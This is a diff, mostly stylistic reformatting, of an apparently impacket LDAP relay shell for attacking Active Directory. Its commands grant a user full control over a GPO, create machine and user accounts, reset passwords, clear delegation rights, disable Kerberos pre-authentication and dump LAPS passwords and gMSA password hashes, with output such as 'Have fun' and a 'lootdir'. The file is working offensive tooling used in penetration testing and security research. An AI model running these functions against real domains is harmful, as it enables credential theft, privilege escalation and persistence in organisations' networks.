@@ -26,43 +26,47 @@ import shlex
 from impacket import LOG
 from Cryptodome.Hash import MD4
 from ldap3.protocol.microsoft import security_descriptor_control
-from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
 from impacket.ldap import ldaptypes
-from impacket.structure import Structure, hexdump
+from dsinternals.system.Guid import Guid
+from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
+from dsinternals.system.DateTime import DateTime
+from dsinternals.common.data.hello.KeyCredential import KeyCredential
+from impacket.structure import Structure
+
 
 class MSDS_MANAGEDPASSWORD_BLOB(Structure):
     structure = (
-        ('Version','<H'),
-        ('Reserved','<H'),
-        ('Length','<L'),
-        ('CurrentPasswordOffset','<H'),
-        ('PreviousPasswordOffset','<H'),
-        ('QueryPasswordIntervalOffset','<H'),
-        ('UnchangedPasswordIntervalOffset','<H'),
-        ('CurrentPassword',':'),
-        ('PreviousPassword',':'),
-        #('AlignmentPadding',':'),
-        ('QueryPasswordInterval',':'),
-        ('UnchangedPasswordInterval',':'),
+        ("Version", "<H"),
+        ("Reserved", "<H"),
+        ("Length", "<L"),
+        ("CurrentPasswordOffset", "<H"),
+        ("PreviousPasswordOffset", "<H"),
+        ("QueryPasswordIntervalOffset", "<H"),
+        ("UnchangedPasswordIntervalOffset", "<H"),
+        ("CurrentPassword", ":"),
+        ("PreviousPassword", ":"),
+        # ('AlignmentPadding',':'),
+        ("QueryPasswordInterval", ":"),
+        ("UnchangedPasswordInterval", ":"),
     )
 
-    def __init__(self, data = None):
-        Structure.__init__(self, data = data)
+    def __init__(self, data=None):
+        Structure.__init__(self, data=data)
 
     def fromString(self, data):
-        Structure.fromString(self,data)
+        Structure.fromString(self, data)
 
-        if self['PreviousPasswordOffset'] == 0:
-            endData = self['QueryPasswordIntervalOffset']
+        if self["PreviousPasswordOffset"] == 0:
+            endData = self["QueryPasswordIntervalOffset"]
         else:
-            endData = self['PreviousPasswordOffset']
+            endData = self["PreviousPasswordOffset"]
 
-        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
-        if self['PreviousPasswordOffset'] != 0:
-            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]
+        self["CurrentPassword"] = self.rawData[self["CurrentPasswordOffset"] :][: endData - self["CurrentPasswordOffset"]]
+        if self["PreviousPasswordOffset"] != 0:
+            self["PreviousPassword"] = self.rawData[self["PreviousPasswordOffset"] :][: self["QueryPasswordIntervalOffset"] - self["PreviousPasswordOffset"]]
 
-        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
-        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]
+        self["QueryPasswordInterval"] = self.rawData[self["QueryPasswordIntervalOffset"] :][: self["UnchangedPasswordIntervalOffset"] - self["QueryPasswordIntervalOffset"]]
+        self["UnchangedPasswordInterval"] = self.rawData[self["UnchangedPasswordIntervalOffset"] :]
 
 
 class LdapShell(cmd.Cmd):
@@ -73,8 +77,8 @@ class LdapShell(cmd.Cmd):
 
         if PY2:
             # switch to unicode.
-            reload(sys) # noqa: F821 pylint:disable=undefined-variable
-            sys.setdefaultencoding('utf8')
+            reload(sys)  # noqa: F821 pylint:disable=undefined-variable
+            sys.setdefaultencoding("utf8")
 
         sys.stdout = tcp_shell.stdout
         sys.stdin = tcp_shell.stdin
@@ -82,9 +86,9 @@ class LdapShell(cmd.Cmd):
         self.use_rawinput = False
         self.shell = tcp_shell
 
-        self.prompt = '\n# '
+        self.prompt = "\n# "
         self.tid = None
-        self.intro = 'Type help for list of commands'
+        self.intro = "Type help for list of commands"
         self.loggedIn = True
         self.last_output = None
         self.completion = []
@@ -101,72 +105,72 @@ class LdapShell(cmd.Cmd):
         except Exception as e:
             print(e)
             LOG.error(e)
-            LOG.debug('Exception info', exc_info=True)
+            LOG.debug("Exception info", exc_info=True)
 
         return ret_val
 
     def create_empty_sd(self):
         sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
-        sd['Revision'] = b'\x01'
-        sd['Sbz1'] = b'\x00'
-        sd['Control'] = 32772
-        sd['OwnerSid'] = ldaptypes.LDAP_SID()
+        sd["Revision"] = b"\x01"
+        sd["Sbz1"] = b"\x00"
+        sd["Control"] = 32772
+        sd["OwnerSid"] = ldaptypes.LDAP_SID()
         # BUILTIN\Administrators
-        sd['OwnerSid'].fromCanonical('S-1-5-32-544')
-        sd['GroupSid'] = b''
-        sd['Sacl'] = b''
+        sd["OwnerSid"].fromCanonical("S-1-5-32-544")
+        sd["GroupSid"] = b""
+        sd["Sacl"] = b""
         acl = ldaptypes.ACL()
-        acl['AclRevision'] = 4
-        acl['Sbz1'] = 0
-        acl['Sbz2'] = 0
+        acl["AclRevision"] = 4
+        acl["Sbz1"] = 0
+        acl["Sbz2"] = 0
         acl.aces = []
-        sd['Dacl'] = acl
+        sd["Dacl"] = acl
         return sd
 
     def create_allow_ace(self, sid):
         nace = ldaptypes.ACE()
-        nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
-        nace['AceFlags'] = 0x00
+        nace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+        nace["AceFlags"] = 0x00
         acedata = ldaptypes.ACCESS_ALLOWED_ACE()
-        acedata['Mask'] = ldaptypes.ACCESS_MASK()
-        acedata['Mask']['Mask'] = 983551 # Full control
-        acedata['Sid'] = ldaptypes.LDAP_SID()
-        acedata['Sid'].fromCanonical(sid)
-        nace['Ace'] = acedata
+        acedata["Mask"] = ldaptypes.ACCESS_MASK()
+        acedata["Mask"]["Mask"] = 983551  # Full control
+        acedata["Sid"] = ldaptypes.LDAP_SID()
+        acedata["Sid"].fromCanonical(sid)
+        nace["Ace"] = acedata
         return nace
 
     def do_write_gpo_dacl(self, line):
         args = shlex.split(line)
-        print ("Adding %s to GPO with GUID %s" % (args[0], args[1]))
+        print("Adding %s to GPO with GUID %s" % (args[0], args[1]))
         if len(args) != 2:
             raise Exception("A samaccountname and GPO sid are required.")
 
         tgtUser = args[0]
         gposid = args[1]
-        self.client.search(self.domain_dumper.root, '(&(objectclass=person)(sAMAccountName=%s))' % tgtUser, attributes=['objectSid'])
-        if len( self.client.entries) <= 0:
+        self.client.search(self.domain_dumper.root, "(&(objectclass=person)(sAMAccountName=%s))" % tgtUser, attributes=["objectSid"])
+        if len(self.client.entries) <= 0:
             raise Exception("Didnt find the given user")
 
         user = self.client.entries[0]
 
         controls = security_descriptor_control(sdflags=0x04)
-        self.client.search(self.domain_dumper.root, '(&(objectclass=groupPolicyContainer)(name=%s))' % gposid, attributes=['objectSid','nTSecurityDescriptor'], controls=controls)
+        self.client.search(self.domain_dumper.root, "(&(objectclass=groupPolicyContainer)(name=%s))" % gposid, attributes=["objectSid", "nTSecurityDescriptor"], controls=controls)
 
-        if len( self.client.entries) <= 0:
+        if len(self.client.entries) <= 0:
             raise Exception("Didnt find the given gpo")
         gpo = self.client.entries[0]
 
-        secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
+        secDescData = gpo["nTSecurityDescriptor"].raw_values[0]
         secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
-        newace = self.create_allow_ace(str(user['objectSid']))
-        secDesc['Dacl']['Data'].append(newace)
+        newace = self.create_allow_ace(str(user["objectSid"]))
+        secDesc["Dacl"]["Data"].append(newace)
         data = secDesc.getData()
 
-        self.client.modify(gpo.entry_dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
+        self.client.modify(gpo.entry_dn, {"nTSecurityDescriptor": (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
         if self.client.result["result"] == 0:
-            print('LDAP server claims to have taken the secdescriptor. Have fun')
+            print("LDAP server claims to have taken the secdescriptor. Have fun")
         else:
-            raise Exception("Something wasnt right: %s" %str(self.client.result['description']))
+            raise Exception("Something wasnt right: %s" % str(self.client.result["description"]))
 
     def do_add_computer(self, line):
         args = shlex.split(line)
@@ -174,76 +178,72 @@ class LdapShell(cmd.Cmd):
         if not self.client.server.ssl and not self.client.tls_started:
             print("Error adding a new computer with LDAP requires LDAPS.")
 
-        if len(args) != 1 and len(args) != 2 and len(args) !=3:
+        if len(args) != 1 and len(args) != 2 and len(args) != 3:
             raise Exception("Error expected a computer name, an optional password argument, and an optional nospns argument.")
 
         computer_name = args[0]
-        if not computer_name.endswith('$'):
-            computer_name += '$'
+        if not computer_name.endswith("$"):
+            computer_name += "$"
 
         print("Attempting to add a new computer with the name: %s" % computer_name)
 
         password = ""
         if len(args) == 1 or args[1] == "nospns":
-            password = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
+            password = "".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
         else:
             password = args[1]
 
         domain_dn = self.domain_dumper.root
-        domain = re.sub(',DC=', '.', domain_dn[domain_dn.find('DC='):], flags=re.I)[3:]
+        domain = re.sub(",DC=", ".", domain_dn[domain_dn.find("DC=") :], flags=re.I)[3:]
 
         print("Inferred Domain DN: %s" % domain_dn)
         print("Inferred Domain Name: %s" % domain)
 
-        computer_hostname = computer_name[:-1] # Remove $ sign
+        computer_hostname = computer_name[:-1]  # Remove $ sign
         computer_dn = "CN=%s,CN=Computers,%s" % (computer_hostname, self.domain_dumper.root)
         print("New Computer DN: %s" % computer_dn)
-        
+
         if len(args) == 3:
             if args[2] == "nospns":
-                spns = [
-                    'HOST/%s.%s' % (computer_hostname, domain)
-                ]
+                spns = ["HOST/%s.%s" % (computer_hostname, domain)]
             else:
-                raise Exception("Invalid third argument: %s" %str(args[3]))     
+                raise Exception("Invalid third argument: %s" % str(args[3]))
         elif len(args) == 2:
             if args[1] != "nospns":
                 spns = [
-                    'HOST/%s' % computer_hostname,
-                    'HOST/%s.%s' % (computer_hostname, domain),
-                    'RestrictedKrbHost/%s' % computer_hostname,
-                    'RestrictedKrbHost/%s.%s' % (computer_hostname, domain),
+                    "HOST/%s" % computer_hostname,
+                    "HOST/%s.%s" % (computer_hostname, domain),
+                    "RestrictedKrbHost/%s" % computer_hostname,
+                    "RestrictedKrbHost/%s.%s" % (computer_hostname, domain),
                 ]
             elif args[1] == "nospns":
-                spns = [
-                    'HOST/%s.%s' % (computer_hostname, domain)
-                ]
+                spns = ["HOST/%s.%s" % (computer_hostname, domain)]
         elif len(args) == 1:
             spns = [
-                'HOST/%s' % computer_hostname,
-                'HOST/%s.%s' % (computer_hostname, domain),
-                'RestrictedKrbHost/%s' % computer_hostname,
-                'RestrictedKrbHost/%s.%s' % (computer_hostname, domain),
+                "HOST/%s" % computer_hostname,
+                "HOST/%s.%s" % (computer_hostname, domain),
+                "RestrictedKrbHost/%s" % computer_hostname,
+                "RestrictedKrbHost/%s.%s" % (computer_hostname, domain),
             ]
         else:
-            raise Exception("Invalid third argument: %s" %str(self.args[3])) 
+            raise Exception("Invalid third argument: %s" % str(self.args[3]))
         ucd = {
-            'dnsHostName': '%s.%s' % (computer_hostname, domain),
-            'userAccountControl': 4096,
-            'servicePrincipalName': spns,
-            'sAMAccountName': computer_name,
-            'unicodePwd': '"{}"'.format(password).encode('utf-16-le')
+            "dnsHostName": "%s.%s" % (computer_hostname, domain),
+            "userAccountControl": 4096,
+            "servicePrincipalName": spns,
+            "sAMAccountName": computer_name,
+            "unicodePwd": '"{}"'.format(password).encode("utf-16-le"),
         }
 
-        res = self.client.add(computer_dn, ['top','person','organizationalPerson','user','computer'], ucd)
+        res = self.client.add(computer_dn, ["top", "person", "organizationalPerson", "user", "computer"], ucd)
 
         if not res:
-            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM: 
+            if self.client.result["result"] == RESULT_UNWILLING_TO_PERFORM:
                 print("Failed to add a new computer. The server denied the operation.")
             else:
-                print('Failed to add a new computer: %s' % str(self.client.result))
+                print("Failed to add a new computer: %s" % str(self.client.result))
         else:
-            print('Adding new computer with username: %s and password: %s result: OK' % (computer_name, password))
+            print("Adding new computer with username: %s and password: %s result: OK" % (computer_name, password))
 
     def do_rename_computer(self, line):
         args = shlex.split(line)
@@ -255,9 +255,9 @@ class LdapShell(cmd.Cmd):
 
         new_name = args[1]
 
-        self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(current_name), attributes=['objectSid', 'sAMAccountName'])
+        self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(current_name), attributes=["objectSid", "sAMAccountName"])
         computer_dn = self.client.entries[0].entry_dn
-        
+
         if not computer_dn:
             raise Exception("Computer not found in LDAP: %s" % current_name)
 
@@ -266,17 +266,17 @@ class LdapShell(cmd.Cmd):
         print("Original sAMAccountName: %s" % samAccountName)
 
         print("New sAMAccountName: %s" % new_name)
-        self.client.modify(computer_dn, {'sAMAccountName':(ldap3.MODIFY_REPLACE, [new_name])})
-        
+        self.client.modify(computer_dn, {"sAMAccountName": (ldap3.MODIFY_REPLACE, [new_name])})
+
         if self.client.result["result"] == 0:
             print("Updated sAMAccountName successfully")
         else:
-            if self.client.result['result'] == 50:
-                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
-            elif self.client.result['result'] == 19:
-                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            if self.client.result["result"] == 50:
+                raise Exception("Could not modify object, the server reports insufficient rights: %s", self.client.result["message"])
+            elif self.client.result["result"] == 19:
+                raise Exception("Could not modify object, the server reports a constrained violation: %s", self.client.result["message"])
             else:
-                raise Exception('The server returned an error: %s', self.client.result['message'])
+                raise Exception("The server returned an error: %s", self.client.result["message"])
 
     def do_add_user(self, line):
         args = shlex.split(line)
@@ -289,36 +289,36 @@ class LdapShell(cmd.Cmd):
 
         new_user = args[0]
         if len(args) == 1:
-            parent_dn = 'CN=Users,%s' % self.domain_dumper.root
+            parent_dn = "CN=Users,%s" % self.domain_dumper.root
         else:
             parent_dn = args[1]
 
-        new_password = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
+        new_password = "".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
 
-        new_user_dn = 'CN=%s,%s' % (new_user, parent_dn)
+        new_user_dn = "CN=%s,%s" % (new_user, parent_dn)
         ucd = {
-            'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % self.domain_dumper.root,
-            'distinguishedName': new_user_dn,
-            'cn': new_user,
-            'sn': new_user,
-            'givenName': new_user,
-            'displayName': new_user,
-            'name': new_user,
-            'userAccountControl': 512,
-            'accountExpires': '0',
-            'sAMAccountName': new_user,
-            'unicodePwd': '"{}"'.format(new_password).encode('utf-16-le')
+            "objectCategory": "CN=Person,CN=Schema,CN=Configuration,%s" % self.domain_dumper.root,
+            "distinguishedName": new_user_dn,
+            "cn": new_user,
+            "sn": new_user,
+            "givenName": new_user,
+            "displayName": new_user,
+            "name": new_user,
+            "userAccountControl": 512,
+            "accountExpires": "0",
+            "sAMAccountName": new_user,
+            "unicodePwd": '"{}"'.format(new_password).encode("utf-16-le"),
         }
 
-        print('Attempting to create user in: %s', parent_dn)
-        res = self.client.add(new_user_dn, ['top', 'person', 'organizationalPerson', 'user'], ucd)
+        print("Attempting to create user in: %s", parent_dn)
+        res = self.client.add(new_user_dn, ["top", "person", "organizationalPerson", "user"], ucd)
         if not res:
-            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
-                raise Exception('Failed to add a new user. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing user.')
+            if self.client.result["result"] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
+                raise Exception("Failed to add a new user. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing user.")
             else:
-                raise Exception('Failed to add a new user: %s' % str(self.client.result['description']))
+                raise Exception("Failed to add a new user: %s" % str(self.client.result["description"]))
         else:
-            print('Adding new user with username: %s and password: %s result: OK' % (new_user, new_password))
+            print("Adding new user with username: %s and password: %s result: OK" % (new_user, new_password))
 
     def do_add_user_to_group(self, line):
         user_name, group_name = shlex.split(line)
@@ -331,14 +331,14 @@ class LdapShell(cmd.Cmd):
         if not group_dn:
             raise Exception("Group not found in LDAP: %s" % group_name)
 
-        user_name = user_dn.split(',')[0][3:]
-        group_name = group_dn.split(',')[0][3:]
+        user_name = user_dn.split(",")[0][3:]
+        group_name = group_dn.split(",")[0][3:]
 
-        res = self.client.modify(group_dn, {'member': [(ldap3.MODIFY_ADD, [user_dn])]})
+        res = self.client.modify(group_dn, {"member": [(ldap3.MODIFY_ADD, [user_dn])]})
         if res:
-            print('Adding user: %s to group %s result: OK' % (user_name, group_name))
+            print("Adding user: %s to group %s result: OK" % (user_name, group_name))
         else:
-            raise Exception('Failed to add user to %s group: %s' % (group_name, str(self.client.result['description'])))
+            raise Exception("Failed to add user to %s group: %s" % (group_name, str(self.client.result["description"])))
 
     def do_change_password(self, line):
         args = shlex.split(line)
@@ -351,26 +351,26 @@ class LdapShell(cmd.Cmd):
 
         password = ""
         if len(args) == 1:
-            password = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
+            password = "".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
         else:
             password = args[1]
 
         print("Attempting to set new password of: %s" % password)
         success = self.client.extend.microsoft.modify_password(user_dn, password)
 
-        if self.client.result['result'] == 0:
-            print('Password changed successfully!')
+        if self.client.result["result"] == 0:
+            print("Password changed successfully!")
         else:
-            if self.client.result['result'] == 50:
-                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
-            elif self.client.result['result'] == 19:
-                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            if self.client.result["result"] == 50:
+                raise Exception("Could not modify object, the server reports insufficient rights: %s", self.client.result["message"])
+            elif self.client.result["result"] == 19:
+                raise Exception("Could not modify object, the server reports a constrained violation: %s", self.client.result["message"])
             else:
-                raise Exception('The server returned an error: %s', self.client.result['message'])
+                raise Exception("The server returned an error: %s", self.client.result["message"])
 
     def do_clear_rbcd(self, computer_name):
 
-        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(computer_name), attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
+        success = self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(computer_name), attributes=["objectSid", "msDS-AllowedToActOnBehalfOfOtherIdentity"])
         if success is False or len(self.client.entries) != 1:
             raise Exception("Error expected only one search result got %d results", len(self.client.entries))
 
@@ -381,32 +381,32 @@ class LdapShell(cmd.Cmd):
 
         sd = self.create_empty_sd()
 
-        self.client.modify(target.entry_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
-        if self.client.result['result'] == 0:
-            print('Delegation rights cleared successfully!')
+        self.client.modify(target.entry_dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity": [ldap3.MODIFY_REPLACE, [sd.getData()]]})
+        if self.client.result["result"] == 0:
+            print("Delegation rights cleared successfully!")
         else:
-            if self.client.result['result'] == 50:
-                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
-            elif self.client.result['result'] == 19:
-                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            if self.client.result["result"] == 50:
+                raise Exception("Could not modify object, the server reports insufficient rights: %s", self.client.result["message"])
+            elif self.client.result["result"] == 19:
+                raise Exception("Could not modify object, the server reports a constrained violation: %s", self.client.result["message"])
             else:
-                raise Exception('The server returned an error: %s', self.client.result['message'])
+                raise Exception("The server returned an error: %s", self.client.result["message"])
 
     def do_dump(self, line):
-        print('Dumping domain info...')
+        print("Dumping domain info...")
         self.stdout.flush()
         self.domain_dumper.domainDump()
-        print('Domain info dumped into lootdir!')
+        print("Domain info dumped into lootdir!")
 
     def do_start_tls(self, line):
         if not self.client.tls_started and not self.client.server.ssl:
-            print('Sending StartTLS command...')
+            print("Sending StartTLS command...")
             if not self.client.start_tls():
                 raise Exception("StartTLS failed")
             else:
-                print('StartTLS succeded, you are now using LDAPS!')
+                print("StartTLS succeded, you are now using LDAPS!")
         else:
-            print('It seems you are already connected through a TLS channel.')
+            print("It seems you are already connected through a TLS channel.")
 
     def do_disable_account(self, username):
         self.toggle_account_enable_disable(username, False)
@@ -416,7 +416,7 @@ class LdapShell(cmd.Cmd):
 
     def toggle_account_enable_disable(self, user_name, enable):
         UF_ACCOUNT_DISABLE = 2
-        self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(user_name), attributes=['objectSid', 'userAccountControl'])
+        self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(user_name), attributes=["objectSid", "userAccountControl"])
 
         if len(self.client.entries) != 1:
             raise Exception("Error expected only one search result got %d results", len(self.client.entries))
@@ -428,38 +428,38 @@ class LdapShell(cmd.Cmd):
         entry = self.client.entries[0]
         userAccountControl = entry["userAccountControl"].value
 
-        print("Original userAccountControl: %d" % userAccountControl) 
+        print("Original userAccountControl: %d" % userAccountControl)
 
         if enable:
             userAccountControl = userAccountControl & ~UF_ACCOUNT_DISABLE
         else:
             userAccountControl = userAccountControl | UF_ACCOUNT_DISABLE
 
-        self.client.modify(user_dn, {'userAccountControl':(ldap3.MODIFY_REPLACE, [userAccountControl])})
+        self.client.modify(user_dn, {"userAccountControl": (ldap3.MODIFY_REPLACE, [userAccountControl])})
 
-        if self.client.result['result'] == 0:
+        if self.client.result["result"] == 0:
             print("Updated userAccountControl attribute successfully")
         else:
-            if self.client.result['result'] == 50:
-                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
-            elif self.client.result['result'] == 19:
-                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            if self.client.result["result"] == 50:
+                raise Exception("Could not modify object, the server reports insufficient rights: %s", self.client.result["message"])
+            elif self.client.result["result"] == 19:
+                raise Exception("Could not modify object, the server reports a constrained violation: %s", self.client.result["message"])
             else:
-                raise Exception('The server returned an error: %s', self.client.result['message'])
+                raise Exception("The server returned an error: %s", self.client.result["message"])
 
     def do_search(self, line):
         arguments = shlex.split(line)
         if len(arguments) == 0:
             raise Exception("A query is required.")
 
-        filter_attributes = ['name', 'distinguishedName', 'sAMAccountName']
+        filter_attributes = ["name", "distinguishedName", "sAMAccountName"]
         attributes = filter_attributes[:]
-        attributes.append('objectSid')
+        attributes.append("objectSid")
         for argument in arguments[1:]:
             attributes.append(argument)
 
         search_query = "".join("(%s=*%s*)" % (attribute, escape_filter_chars(arguments[0])) for attribute in filter_attributes)
-        self.search('(|%s)' % search_query, *attributes)
+        self.search("(|%s)" % search_query, *attributes)
 
     def do_set_dontreqpreauth(self, line):
         UF_DONT_REQUIRE_PREAUTH = 4194304
@@ -479,7 +479,7 @@ class LdapShell(cmd.Cmd):
         else:
             raise Exception("The specified flag must be either true or false")
 
-        self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(user_name), attributes=['objectSid', 'userAccountControl'])
+        self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(user_name), attributes=["objectSid", "userAccountControl"])
         if len(self.client.entries) != 1:
             raise Exception("Error expected only one search result got %d results", len(self.client.entries))
 
@@ -489,43 +489,43 @@ class LdapShell(cmd.Cmd):
 
         entry = self.client.entries[0]
         userAccountControl = entry["userAccountControl"].value
-        print("Original userAccountControl: %d" % userAccountControl) 
+        print("Original userAccountControl: %d" % userAccountControl)
 
         if flag:
             userAccountControl = userAccountControl | UF_DONT_REQUIRE_PREAUTH
         else:
             userAccountControl = userAccountControl & ~UF_DONT_REQUIRE_PREAUTH
 
-        print("Updated userAccountControl: %d" % userAccountControl) 
-        self.client.modify(user_dn, {'userAccountControl':(ldap3.MODIFY_REPLACE, [userAccountControl])})
+        print("Updated userAccountControl: %d" % userAccountControl)
+        self.client.modify(user_dn, {"userAccountControl": (ldap3.MODIFY_REPLACE, [userAccountControl])})
 
-        if self.client.result['result'] == 0:
+        if self.client.result["result"] == 0:
             print("Updated userAccountControl attribute successfully")
         else:
-            if self.client.result['result'] == 50:
-                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
-            elif self.client.result['result'] == 19:
-                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            if self.client.result["result"] == 50:
+                raise Exception("Could not modify object, the server reports insufficient rights: %s", self.client.result["message"])
+            elif self.client.result["result"] == 19:
+                raise Exception("Could not modify object, the server reports a constrained violation: %s", self.client.result["message"])
             else:
-                raise Exception('The server returned an error: %s', self.client.result['message'])
+                raise Exception("The server returned an error: %s", self.client.result["message"])
 
     def do_get_user_groups(self, user_name):
         user_dn = self.get_dn(user_name)
         if not user_dn:
             raise Exception("User not found in LDAP: %s" % user_name)
 
-        self.search('(member:%s:=%s)' % (LdapShell.LDAP_MATCHING_RULE_IN_CHAIN, escape_filter_chars(user_dn)))
+        self.search("(member:%s:=%s)" % (LdapShell.LDAP_MATCHING_RULE_IN_CHAIN, escape_filter_chars(user_dn)))
 
     def do_get_group_users(self, group_name):
         group_dn = self.get_dn(group_name)
         if not group_dn:
             raise Exception("Group not found in LDAP: %s" % group_name)
 
-        self.search('(memberof:%s:=%s)' % (LdapShell.LDAP_MATCHING_RULE_IN_CHAIN, escape_filter_chars(group_dn)), "sAMAccountName", "name")
+        self.search("(memberof:%s:=%s)" % (LdapShell.LDAP_MATCHING_RULE_IN_CHAIN, escape_filter_chars(group_dn)), "sAMAccountName", "name")
 
     def do_get_laps_password(self, computer_name):
 
-        self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(computer_name), attributes=['ms-MCS-AdmPwd'])
+        self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(computer_name), attributes=["ms-MCS-AdmPwd"])
         if len(self.client.entries) != 1:
             raise Exception("Error expected only one search result got %d results", len(self.client.entries))
 
@@ -538,47 +538,46 @@ class LdapShell(cmd.Cmd):
             print("LAPS Password: %s" % password)
         else:
             print("Unable to Read LAPS Password for Computer")
-    
+
     def do_get_gmsa_password(self, target):
         if target.lower() == "all":
             print("Dumping all gMSA passwords")
             try:
-               success = self.client.search(self.domain_dumper.root, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', attributes=['sAMAccountName','msDS-ManagedPassword'])
-               if success:
-                   for entry in self.client.response:
-                       sam = entry['attributes']['sAMAccountName']
-                       data = entry['attributes']['msDS-ManagedPassword']
-                       blob = MSDS_MANAGEDPASSWORD_BLOB()
-                       blob.fromString(data)
-                       hash = MD4.new ()
-                       hash.update (blob['CurrentPassword'][:-2])
-                       passwd = binascii.hexlify(hash.digest()).decode("utf-8")
-                       userpass = sam + ':::' + passwd
-                       print(userpass)
+                success = self.client.search(self.domain_dumper.root, "(&(ObjectClass=msDS-GroupManagedServiceAccount))", attributes=["sAMAccountName", "msDS-ManagedPassword"])
+                if success:
+                    for entry in self.client.response:
+                        sam = entry["attributes"]["sAMAccountName"]
+                        data = entry["attributes"]["msDS-ManagedPassword"]
+                        blob = MSDS_MANAGEDPASSWORD_BLOB()
+                        blob.fromString(data)
+                        hash = MD4.new()
+                        hash.update(blob["CurrentPassword"][:-2])
+                        passwd = binascii.hexlify(hash.digest()).decode("utf-8")
+                        userpass = sam + ":::" + passwd
+                        print(userpass)
             except:
-                pass    
-                
-                
+                pass
+
         elif target != "":
             print("Dumping %s gMSA password" % target)
             try:
-               success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target), attributes=['sAMAccountName','msDS-ManagedPassword'])
-               if success:
-                   for entry in self.client.response:
-                       sam = entry['attributes']['sAMAccountName']
-                       data = entry['attributes']['msDS-ManagedPassword']
-                       blob = MSDS_MANAGEDPASSWORD_BLOB()
-                       blob.fromString(data)
-                       hash = MD4.new ()
-                       hash.update (blob['CurrentPassword'][:-2])
-                       passwd = binascii.hexlify(hash.digest()).decode("utf-8")
-                       userpass = sam + ':::' + passwd
-                       print(userpass)
+                success = self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(target), attributes=["sAMAccountName", "msDS-ManagedPassword"])
+                if success:
+                    for entry in self.client.response:
+                        sam = entry["attributes"]["sAMAccountName"]
+                        data = entry["attributes"]["msDS-ManagedPassword"]
+                        blob = MSDS_MANAGEDPASSWORD_BLOB()
+                        blob.fromString(data)
+                        hash = MD4.new()
+                        hash.update(blob["CurrentPassword"][:-2])
+                        passwd = binascii.hexlify(hash.digest()).decode("utf-8")
+                        userpass = sam + ":::" + passwd
+                        print(userpass)
             except:
-                pass  
+                pass
         else:
-            print("Expected target name")     
-    
+            print("Expected target name")
+
     def do_grant_control(self, line):
         args = shlex.split(line)
 
@@ -590,7 +589,7 @@ class LdapShell(cmd.Cmd):
         target_name = args[0]
         grantee_name = args[1]
 
-        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target_name), attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)
+        success = self.client.search(self.domain_dumper.root, "(sAMAccountName=%s)" % escape_filter_chars(target_name), attributes=["objectSid", "nTSecurityDescriptor"], controls=controls)
         if success is False or len(self.client.entries) != 1:
             raise Exception("Error expected only one search result got %d results", len(self.client.entries))
 
@@ -599,7 +598,7 @@ class LdapShell(cmd.Cmd):
